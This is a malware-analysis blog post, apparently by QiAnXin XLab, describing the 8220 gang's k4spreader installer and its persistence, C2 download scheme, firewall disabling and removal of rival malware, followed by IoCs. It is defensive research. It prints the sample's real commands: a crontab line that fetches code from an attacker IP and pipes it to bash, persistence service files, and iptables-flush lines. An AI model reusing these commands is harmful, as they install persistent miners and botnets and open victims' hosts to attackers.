<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <title>8220 Mining Gang&#x27;s New Tool: k4spreader</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=256e1729b4" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=256e1729b4" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=256e1729b4" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.css">

    <style>
        .gh-sidebar{
            width: 300px;
            left: -40px;
        }
        .gh-content ol ol li{
            list-style-type: none;
        }
        .gh-content {
            position: relative;
        }

        .gh-toc > .toc-list {
            position: relative;
            font-size: 12px;
             
        }

        .toc-list {
            overflow: hidden;
            list-style: none;
        }

        @media (min-width: 1300px) {
            .gh-sidebar {
                position: absolute; 
                top: 0;
                bottom: 0;
                margin-top: 4vmin;
                grid-column: wide-start / main-start; /* Place the TOC to the left of the content */
            }
        
            .gh-toc {
                position: sticky; /* On larger screens, TOC will stay in the same spot on the page */
                top: 4vmin;
            }
        }

        .gh-toc .is-active-link::before {
            background-color: var(--ghost-accent-color); /* Defines TOC   accent color based on Accent color set in Ghost Admin */
        } 
    </style>

    <link rel="icon" href="https://blog.xlab.qianxin.com/content/images/size/w256h256/2023/10/xlab-icon-1.png" type="image/png">
    <link rel="canonical" href="https://blog.xlab.qianxin.com/8220-k4spreader-new-tool-en/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="奇安信 X 实验室">
    <meta property="og:type" content="article">
    <meta property="og:title" content="8220 Mining Gang&#x27;s New Tool: k4spreader">
    <meta property="og:description" content="Overview

On June 17, 2024, we discovered an ELF sample written in C language with a detection rate of 0 on VT. This sample was packed with a modified upx packer. After unpacking, another modified upx-packed elf file was obtained which was written in CGO mode. After analysis, it was">
    <meta property="og:url" content="https://blog.xlab.qianxin.com/8220-k4spreader-new-tool-en/">
    <meta property="og:image" content="https://blog.xlab.qianxin.com/content/images/2024/06/k4spreader-1.webp">
    <meta property="article:published_time" content="2024-06-25T14:00:06.000Z">
    <meta property="article:modified_time" content="2024-08-15T02:33:23.000Z">
    <meta property="article:tag" content="Backdoor">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="Miner">
    <meta property="article:tag" content="DDoS">
    <meta property="article:tag" content="EN">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="8220 Mining Gang&#x27;s New Tool: k4spreader">
    <meta name="twitter:description" content="Overview

On June 17, 2024, we discovered an ELF sample written in C language with a detection rate of 0 on VT. This sample was packed with a modified upx packer. After unpacking, another modified upx-packed elf file was obtained which was written in CGO mode. After analysis, it was">
    <meta name="twitter:url" content="https://blog.xlab.qianxin.com/8220-k4spreader-new-tool-en/">
    <meta name="twitter:image" content="https://blog.xlab.qianxin.com/content/images/2024/06/k4spreader-1.webp">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="daji">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Backdoor, Botnet, Miner, DDoS, EN">
    <meta name="twitter:site" content="@Xlab_qax">
    <meta property="og:image:width" content="1792">
    <meta property="og:image:height" content="1024">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "奇安信 X 实验室",
        "url": "https://blog.xlab.qianxin.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.xlab.qianxin.com/content/images/size/w256h256/2023/10/xlab-icon-1.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "daji",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.xlab.qianxin.com/content/images/2023/11/9d1d840fbdea998f.jpeg",
            "width": 232,
            "height": 281
        },
        "url": "https://blog.xlab.qianxin.com/author/daji/",
        "sameAs": []
    },
    "headline": "8220 Mining Gang&#x27;s New Tool: k4spreader",
    "url": "https://blog.xlab.qianxin.com/8220-k4spreader-new-tool-en/",
    "datePublished": "2024-06-25T14:00:06.000Z",
    "dateModified": "2024-08-15T02:33:23.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://blog.xlab.qianxin.com/content/images/2024/06/k4spreader-1.webp",
        "width": 1792,
        "height": 1024
    },
    "keywords": "Backdoor, Botnet, Miner, DDoS, EN",
    "description": "Overview\n\nOn June 17, 2024, we discovered an ELF sample written in C language with a detection rate of 0 on VT. This sample was packed with a modified upx packer. After unpacking, another modified upx-packed elf file was obtained which was written in CGO mode. After analysis, it was found that this is a new tool from the &quot;8220&quot; mining gang, which is used to install other malware, mainly to install the Tsunami DDoS botnet and the PwnRig mining program. We named it &quot;k4spreader&quot; based on the functi",
    "mainEntityOfPage": "https://blog.xlab.qianxin.com/8220-k4spreader-new-tool-en/"
}
    </script>

    <meta name="generator" content="Ghost 5.70">
    <link rel="alternate" type="application/rss+xml" title="奇安信 X 实验室" href="https://blog.xlab.qianxin.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="85bfb974adb4cf4f0cda2658c7" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.xlab.qianxin.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.xlab.qianxin.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=256e1729b4"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=256e1729b4">
    <script defer src="/public/comment-counts.min.js?v=256e1729b4" data-ghost-comments-counts-api="https://blog.xlab.qianxin.com/members/api/comments/counts/"></script>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-8T4S62VBFD"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-8T4S62VBFD');
</script>
<style>:root {--ghost-accent-color: #4ca2ba;}</style>

</head>
<body class="post-template tag-backdoor tag-botnet tag-miner tag-ddos tag-en is-head-middle-logo has-serif-title has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="https://blog.xlab.qianxin.com">
                        奇安信 X 实验室
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://blog.xlab.qianxin.com/">Home</a></li>
    <li class="nav-about"><a href="https://blog.xlab.qianxin.com/about/">About</a></li>
    <li class="nav-en"><a href="https://blog.xlab.qianxin.com/tag/en/">EN</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-backdoor tag-botnet tag-miner tag-ddos tag-en ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/backdoor/">Backdoor</a>
                </span>
        </div>

        <h1 class="article-title">8220 Mining Gang&#x27;s New Tool: k4spreader</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/daji/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/11/9d1d840fbdea998f.jpeg" alt="daji" />
                    </a>
                </li>
                <li class="author-list-item">
                    <a href="/author/acey9/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/11/3346712.jpeg" alt="Acey9" />
                    </a>
                </li>
                <li class="author-list-item">
                    <a href="/author/zhangzaifeng/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/12/avatar.png" alt="zhangzaifeng" />
                    </a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/daji/">daji</a>, <a href="/author/acey9/">Acey9</a>, <a href="/author/zhangzaifeng/">zhangzaifeng</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2024-06-25">2024年6月25日</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
                </div>
            </div>

        </section>
        </div>

            <figure class="article-image">
                <img
                    src="/content/images/size/w2000/2024/06/k4spreader-1.webp"
                    alt="8220 Mining Gang&#x27;s New Tool: k4spreader"
                />
            </figure>

    </header>

    <section class="gh-content gh-canvas">
        <aside class="gh-sidebar"><div class="gh-toc"></div></aside> 
        <p></p><h1 id="overview">Overview</h1><p>On June 17, 2024, we discovered an ELF sample written in C language with a detection rate of 0 on VT. This sample was packed with a modified upx packer. After unpacking, another modified upx-packed elf file was obtained which was written in CGO mode. After analysis, it was found that this is a new tool from the "8220" mining gang, which is used to install other malware, mainly to install the Tsunami DDoS botnet and the PwnRig mining program. We named it <strong>"k4spreader"</strong> based on the function name in the sample. After further analyzing the data of VT and our honeypots, we found that k4spreader is still in the development stage, but 3 variants have appeared, so we decide to give a brief introduction here.</p><blockquote>"8220" gang: Also known as "Water Sigbin", a mining gang from China that has been active since 2017. In November 2017, it used the Weblogic deserialization vulnerability (CVE- 2017-10271) invading a server and implanting a mining Trojan. This is the first publicly disclosed case of using a 0day vulnerability to invade a server and implant a mining Trojan. The gang is good at exploiting vulnerabilities such as deserialization and unauthorized access to attack Windows and Linux servers, and then downloads botnet programs, mining programs, port scanning tools, etc. to control and maliciously exploit the hosts. Mining was the gang's main active area before, but after the Tsunami botnet was used, it can also launch DDoS attacks, so it is no longer just a gang carrying out malicious mining.</blockquote><h4 id="key-points-of-the-article">Key points of the article:</h4><ol>
<li>k4spreader is a new tool of the “8220” mining gang. It is an installer and first appeared in February 2024.</li>
<li>k4spreader is written in cgo, including system persistence, downloading and updating itself, and releasing other malware for execution.</li>
<li>There is a shell version of k4spreader, and the overall function is the same. It can be understood that k4spreader is a binary implementation of the shell version.</li>
<li>k4spreader will currently release Tsunami and PwnRig. The release methods include downloading from C2 and releasing from itself.</li>
<li>k4spreader is still in the development stage, and three versions are currently observed</li>
</ol>
<h1 id="vulnerabilities-and-accesses">Vulnerabilities And Accesses</h1><p>Our Cyber Threat Insight and Analysis system(CTIA) has also observed the spread of k4spreader. Currently, there are few samples and the following vulnerabilities are exploited.</p><pre><code>CVE_2020_14882
JBoss_AS_3456_RCE
YARN_API_RCE</code></pre><p>Our passive DNS system has also observed the C&amp;C accesses of k4spreader. These C&amp;C are not only used by k4spreader, but also by other shell scripts and mining pools belonging to the "8220". Therefore, the overall activity volume is quite high. The data from the past three months is as follows:</p><pre><code>dw.c4kdeliver.top -&gt; 290,000 hits, last activity is at the end of 2024.2
run.sck-dns.ws -&gt; 230,000 hits
run.sck-dns.cc -&gt; None
c4k-ircd.pwndns.pw -&gt; 220,000
pwn.oracleservice.top -&gt; 3000
run.on-demand.pw -&gt; 1600 recent 3 days
fbi.su1001-2.top -&gt; 20,000, last activity is at the end of 2024.2</code></pre><h1 id="sample-analysis"><strong>Sample Analysis</strong></h1><p>Among the three versions of k4spreader, v1/v2 only has one layer of modified upx packer. In order to improve the success rate of static anti-virus, v3 has become two layers of modified upx packer. This is also the case. Today's anti-virus software's detection rate of samples with modified upx packer is not ideal, and k4spreader packs all binary files with modified upx. k4spreader is implemented in CGO mode and the core functions are written in go. The evolution of k4spreader is also a process of increasing functional code:</p><pre><code>v1: Implemented basic system persistence functionality, self-update capability, and the ability to extract and execute the embedded Tsunami/PwnRig.
v2: Based on v1, modified the C&amp;C domain, disabled the firewall, allowed all network traffic, checked the runtime status of the sample, and standardized the sample download process.
v3: Building on v2, further modified the C&amp;C domain, added logging capabilities, detected different runtime ports, and made other minor tweaks and changes.</code></pre><p>The core workflow of k4spreader:</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/06/image-20240622221814389.png" class="kg-image" alt loading="lazy" width="2000" height="1163" srcset="https://blog.xlab.qianxin.com/content/images/size/w600/2024/06/image-20240622221814389.png 600w, https://blog.xlab.qianxin.com/content/images/size/w1000/2024/06/image-20240622221814389.png 1000w, https://blog.xlab.qianxin.com/content/images/size/w1600/2024/06/image-20240622221814389.png 1600w, https://blog.xlab.qianxin.com/content/images/2024/06/image-20240622221814389.png 2222w" sizes="(min-width: 720px) 720px"></figure><p>The overall functions of k4spreader are as follows. The following will no longer explain according to the specific version, but will be described from a functional perspective. All the IoC involved are detailed at the end of the article.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/06/image-2.png" class="kg-image" alt loading="lazy" width="726" height="1564" srcset="https://blog.xlab.qianxin.com/content/images/size/w600/2024/06/image-2.png 600w, https://blog.xlab.qianxin.com/content/images/2024/06/image-2.png 726w" sizes="(min-width: 720px) 720px"></figure><h2 id="1-system-persistence"><strong>1. System Persistence</strong></h2><h3 id="1-modify-the-bash-startup-configuration-file"><strong>&nbsp;(1) Modify the bash startup configuration file</strong></h3><p>The k4spreader_utils_AddLineToBashProfile() function will modify the file <strong>.bash_profile </strong>which is the startup configuration file of bash shell, add the following content. The function is to copy itself to <strong>/bin/klibsystem4</strong> and delete the file after execution. After modification, set .bash_profile to the unchangeable permission via <strong>chattr +ia</strong> to prevent others from modifying it (k4spreader will <strong>chattr -ia</strong> before modifying the file, and then <strong>+ia</strong> after modification). The new version changes klibsystem4 to <strong>klibsystem5</strong>.</p><pre><code>cp -f -r -- %s /bin/klibsystem4 2&gt;/dev/null &amp;&amp; /bin/klibsystem4 &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /bin/klibsystem4 2&gt;/dev/null </code></pre><h3 id="2-add-system-service-through-etcinitd"><strong>&nbsp;(2) Add system service through /etc/init.d</strong></h3><p>The k4spreader_utils_SetupAndStartKnlibService() function will create the service named <strong>knlib</strong> by creating the <strong>/etc/init.d/knlib</strong> file. The content is as follows. The new version changes the service name to <strong>dpkg-deb-package</strong>.</p><pre><code>#!/bin/bash
### BEGIN INIT INFO
# Provides:          knlib
# Required-Start:
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: knlibsystem
### END INIT INFO
cp -f -r -- /bin/knlib /bin/klibsystem4 2&gt;/dev/null
cd /bin 2&gt;/dev/null
nohup ./klibsystem4 &gt;/dev/null 2&gt;&amp;1 &amp;
rm -rf -- klibsystem4 2&gt;/dev/null</code></pre><h3 id="3-add-system-service-through-etcsystemdsystem"><strong>(3) Add system service through /etc/systemd/system</strong></h3><p>The k4spreader_utils_CreateSystemService() function creates a system service by creating the <strong>/etc/systemd/system/knlibe.service</strong> file. The content is as follows. The new version changes the service name to <strong>dpkg-deb-package.service</strong>.</p><pre><code>[Unit]
Description=knlib
Wants=network.target
After=syslog.target network-online.target

[Service]
Type=forking
ExecStart=/bin/bash -c 'cp -f -r -- /bin/knlib /bin/klibsystem4 2&gt;/dev/null &amp;&amp; /bin/klibsystem4 &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /bin/klibsystem4 2&gt;/dev/null'
Restart=always
KillMode=process

[Install]
WantedBy=multi-user.target
Default-Start=2 3 4 5</code></pre><h2 id="2-download-executable-file-from-cc"><strong>2. Download executable file from CC</strong></h2><h3 id="1-download-2gif-and-dpy"><strong>(1) Download 2.gif and d.py</strong></h3><p>k4spreader_utils_GetDownloadRoute() will execute the following command through <strong>bash -c</strong> to create a scheduled task. It will be executed every 10 minutes and download the two files <strong>2.gif</strong> and <strong>d.py</strong> for execution.</p><pre><code>echo '*/10 * * * * (curl -s %s/2.gif || wget -q -O - %s/2.gif || lwp-download %s/2.gif /tmp/2.gif) | bash -sh; bash /tmp/2.gif; rm -rf /tmp/2.gif; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xODUuMTcyLjEyOC4xNDY6NDQzL2QucHkiKS5yZWFkKCkpJyB8fCBweXRob24yIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xODUuMTcyLjEyOC4xNDYvZC5weSIpLnJlYWQoKSkn | base64 -d | bash' | crontab -

The content after b64decode：
python -c 'import urllib;exec(urllib.urlopen("http://185.172.128.146:443/d.py").read())' || python2 -c 'import urllib;exec(urllib.urlopen("http://185.172.128.146/d.py").read())</code></pre><p><strong>2. gif</strong> is a bash script, to be precise, it is the shell version of k4spreader, so its function is roughly the same as k4spreader. See the analysis below for details. <strong>d.py</strong> is a python script whose function is to download <strong>http://185.172.128.146:443/bin</strong>. It actually downloads and executes the new version of k4spreader. The key code is as follows.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/06/image-20240622200131117.png" class="kg-image" alt loading="lazy" width="1414" height="440" srcset="https://blog.xlab.qianxin.com/content/images/size/w600/2024/06/image-20240622200131117.png 600w, https://blog.xlab.qianxin.com/content/images/size/w1000/2024/06/image-20240622200131117.png 1000w, https://blog.xlab.qianxin.com/content/images/2024/06/image-20240622200131117.png 1414w" sizes="(min-width: 720px) 720px"></figure><h3 id="2-download-bi64-and-bin64"><strong>(2) Download bi.64 and bin.64</strong></h3><p>k4spreader will also construct the following two URLs for download and execution. <strong>bi.64 </strong>and <strong>bin.64</strong> are the <strong>Tsunami botnet</strong> and P<strong>wnRig mining program</strong> modified by the 8220 gang respectively. See the detailed analysis below.</p><pre><code>http://185.172.128.146:443/bi.64
http://185.172.128.146:443/bin.64</code></pre><h3 id="3-the-new-version-standardizes-the-file-download-process-base64gzipjson"><strong>(3) The new version standardizes the file download process: base64+gzip+json</strong></h3><p>The new version adds a main_executarProcessarComandoC2_ptr() function, which is specifically used to download samples from C2. <strong><em>This also increases the standardization of the download process.</em></strong> For example, the following two URLs are first spliced ​​for access:</p><pre><code>http://run.sck-dns.ws/sys/index.php
http://run.sck-dns.cc/sys/index.php</code></pre><p>The response data is gzip compressed and base64 encoded:</p><pre><code>H4sIAAAAAAAAAyWKSQqAIBRA955CXIc/0wa8TNgACmli3zbR3UtcvuEhlLL19N6EjWnKtpk1ReV0FLSIUQOIqedi7LjoJi7UoJWSsLhQ12jQlhdukwB9hMs6rCnlUEpbCZ3fz4y/kS15yQeJ8b+QewAAAA==</code></pre><p>After restoration, the content in json format is obtained:</p><pre><code>{
  "command": "d_",
  "url": "http://185.172.128.146:443/bin",
  "path": "/var/tmp/shit",
  "run": "0",
  "timeout": 30
}</code></pre><p>It contains five designed fields that indicate where to download subsequent samples, where to save them and how to execute them:</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/06/image-20240621145144354.png" class="kg-image" alt loading="lazy" width="1454" height="412" srcset="https://blog.xlab.qianxin.com/content/images/size/w600/2024/06/image-20240621145144354.png 600w, https://blog.xlab.qianxin.com/content/images/size/w1000/2024/06/image-20240621145144354.png 1000w, https://blog.xlab.qianxin.com/content/images/2024/06/image-20240621145144354.png 1454w" sizes="(min-width: 720px) 720px"></figure><h2 id="3-release-bi64-and-bin64-from-itself"><strong>3. Release bi.64 and bin.64 from itself</strong></h2><p>In addition to downloading from CC, k4spreader also hardcodes malicious programs into its own data. The k4spreader_utils_ExecuteEmbeddedBin() function will release embedded malicious files for execution. Currently, they are mainly Tsunami botnet and PwnRig. k4spreader has a built-in ELF file table. The starting address of this table is hard-coded. When running, all files will be traversed according to this starting address and released to the <strong>/tmp</strong> directory. The structure of the file table is as shown in the figure below. The structure of each file are separated by <strong>2*16 bytes (64-bit program)</strong>. The possibility that other malware will be added in the future cannot be ruled out.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/06/image-20240621130117847.png" class="kg-image" alt loading="lazy" width="1362" height="380" srcset="https://blog.xlab.qianxin.com/content/images/size/w600/2024/06/image-20240621130117847.png 600w, https://blog.xlab.qianxin.com/content/images/size/w1000/2024/06/image-20240621130117847.png 1000w, https://blog.xlab.qianxin.com/content/images/2024/06/image-20240621130117847.png 1362w" sizes="(min-width: 720px) 720px"></figure><p>bi.64 and bin.64 are Tsunami and PwnRig modified by the "8220" gang respectively. This is not a new operation of the "8220" gang. Related behaviors occurred as early as May 2021. These two files are relatively old. The files may be used for testing during the development phase. For a detailed analysis of these two files, see "<a href="https://www.lacework.com/blog/8220-gangs-recent-use-of-custom-miner-and-botnet?ref=blog.xlab.qianxin.com" rel="noreferrer">8220 Gangs Recent use of Custom Miner and Botnet</a>", which will not be described in this article.</p><h3 id="1-bi64tsunami"><strong>(1) bi.64 -&gt; Tsunami</strong></h3><p>Tsunami is a popular botnet that controls and communicates through the IRC protocol. Its main functions include remote control and DDoS attacks. The emergence of Tsunami shows that the "8220" gang has increased its DDoS business and is no longer a simple mining gang.</p><pre><code>Tsunami：
63a86932a5bad5da32ebd1689aa814b3

IRC config：
Nickname：random generated
channel：#.br
password：ircbot456@

C2:
c4k-ircd.pwndns.pw
pwn.oracleservice.top
51.255.171.23

Port:
80
443</code></pre><h3 id="2-bin64pwnrig"><strong>(2) bin.64 -&gt; PwnRig</strong></h3><p>PwnRig is modified based on the open source XMRig mining program and is used for Monero mining. The mining pool and wallet address are as follows:</p><pre><code>Miner Pool:
915aec68a5b53aa7681a461a122594d9
fbi.su1001-2.top:80
fbi.su1001-2.top:443
fbi.su1001-2.top:8080

b9f096559e923787ebb1288c93ce2902
run.on-demand.pw:80
run.on-demand.pw:8080
run.on-demand.pw:443

Wallet：46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ</code></pre><h2 id="4-other-auxiliary-functions-of-k4spreader"><strong>4. Other auxiliary functions of k4spreader</strong></h2><h3 id="1-close-the-firewall-and-allow-all-network-traffic"><strong>(1) Close the firewall and allow all network traffic</strong></h3><pre><code># disable firewall
ufw disable

# clear the rules of iptables
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F

# clear the content ld.so.preload
chattr -ia /etc/ld.so.preload
cat /dev/null &gt; /etc/ld.so.preload</code></pre><h3 id="2-clean-up-other-malicious-process"><strong>(2) Clean up other malicious process</strong></h3><p>k4spreader will detect and remove suspicious processes and scheduled tasks in the system to remove other malware or botnets.</p><pre><code>crontab -l | sed '/\.bashgo\|pastebin\|onion\|bprofr\|python\|curl\|wget\|\.sh/d' | crontab -
cat /proc/mounts | awk '{print $2}' | grep -P '/proc/\d+' | grep -Po '\d+' | xargs -I % kill -9 %
pgrep -f 'meshagent|kdevchecker|ipv6_addrconfd|kworkerr|cpuhelp|deamon|ksoftriqd|pastebin|solr.sh|solrd|kinsing|kdevtmpfsi|kthreaddk|linuxsys|rnv2ymcl|skid.x86|getpy.sh' | xargs -r kill</code></pre><h3 id="3-log-printing-and-detection-of-running-instances"><strong>(3) Log printing and detection of running instances</strong></h3><p>Other functions include printing the banner below during runtime, printing information of operation status, and determining whether k4spreader is already running by comparing process md5, comparing process ports, etc.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/06/image-20240621142653854.png" class="kg-image" alt loading="lazy" width="1260" height="192" srcset="https://blog.xlab.qianxin.com/content/images/size/w600/2024/06/image-20240621142653854.png 600w, https://blog.xlab.qianxin.com/content/images/size/w1000/2024/06/image-20240621142653854.png 1000w, https://blog.xlab.qianxin.com/content/images/2024/06/image-20240621142653854.png 1260w" sizes="(min-width: 720px) 720px"></figure><pre><code>Operation log:
[WAITING] Checking - Please wait...
[SUCCESS] [0] C - Operation successful</code></pre><h1 id="the-shell-version-of-k4spreader"><strong>The shell version of k4spreader</strong></h1><p>The k4spreader mentioned above will download a file named 2.gif from the C2 for execution. This file is the shell version of k4spreader. There has been relevant analysis. Except that it does not release hard-coded malicious files from itself, other functions are generally the same. And uses the same IP (<strong>185.172.128.146</strong>) as C2: <a href="https://www.uptycs.com/blog/8220-gang-cryptomining-cloud-based-infrastructure-cyber-threat?ref=blog.xlab.qianxin.com" rel="noreferrer">https://www.uptycs.com/blog/8220-gang-cryptomining-cloud-based-infrastructure-cyber-threat</a></p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/06/image-1.png" class="kg-image" alt loading="lazy" width="2000" height="377" srcset="https://blog.xlab.qianxin.com/content/images/size/w600/2024/06/image-1.png 600w, https://blog.xlab.qianxin.com/content/images/size/w1000/2024/06/image-1.png 1000w, https://blog.xlab.qianxin.com/content/images/size/w1600/2024/06/image-1.png 1600w, https://blog.xlab.qianxin.com/content/images/2024/06/image-1.png 2036w" sizes="(min-width: 720px) 720px"></figure><h1 id="conclusion">Conclusion</h1><p>The “8220” is a mining gang that has been active since 2017 and has been exposed many times. The k4spreader is its newly developed binary installer, which is still in the development stage. Readers interested in our research are welcome to contact us via <a href="https://twitter.com/Xlab_qax?ref=blog.xlab.qianxin.com" rel="noreferrer">Twitter</a>.</p><h1 id="ioc"><strong>IoC</strong></h1><pre><code>Samples
7bade55726a3a6e86d809836d1bc43f4f7702ecde9ceed80a09876c2efeff8d4 - v1
f998aeb84da8b84723ca9fdbdeb565dbc7938bd0a0ce5f0981307b3e24bdf712 - v2
0897b1d3e3e453c160bf8d28a041eee3bd29e43a6f063faed7d3cb83a86b88cc - v2
a980b1b0387534da7c9a321f7d450c02087f7a8445fc86b77785da0c510bbaa8 - v2
31fd924b9a5747befdf61c03b02c90d3c2ba93c8e1a9f798e6dfefe23767e1ae - v3
20d08d27631ae9bab8f3cb7cddd9b35fb75e5bee5764072f77ac3b4513307838 - v3
d96b9b6d2427c3e8be2f87de474715d06b11b972 - 2.gif
a2b34f3cfcf584e90c13580e9e0f8b9306e9f6c9 - d.py
63a86932a5bad5da32ebd1689aa814b3 - Tsunami
915aec68a5b53aa7681a461a122594d9 - PwnRig
b9f096559e923787ebb1288c93ce2902 - PwnRig

Ip
185.172.128.146	Russia|Yamalo-Nenetskiy avtonomnyy okrug|Pangody AS50916|CityLink Ltd
51.255.171.23	France|Hauts-de-France|Roubaix AS16276|OVH SAS
167.114.114.169	Canada|Quebec|Montreal	AS16276|OVH SAS

Domain
dw.c4kdeliver.top
run.sck-dns.ws
run.sck-dns.cc
c4k-ircd.pwndns.pw
pwn.oracleservice.top
run.on-demand.pw
fbi.su1001-2.top

Wallet
46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ</code></pre>
    </section>

    <section class="article-comments gh-canvas">
        <div id="disqus_thread"></div>
        <script>
            var disqus_config = function () {
                this.page.url = "https://blog.xlab.qianxin.com/8220-k4spreader-new-tool-en/";  
                this.page.identifier = "ghost-66793d60fd1b1b0001084973"
            };
            (function() {
            var d = document, s = d.createElement('script');
            s.src = 'https://xlab-qax.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </section>
</article>
</main>





    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.xlab.qianxin.com">奇安信 X 实验室</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                <ul class="nav">
    <li class="nav-rss"><a href="https://blog.xlab.qianxin.com/rss/">RSS</a></li>
</ul>

            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
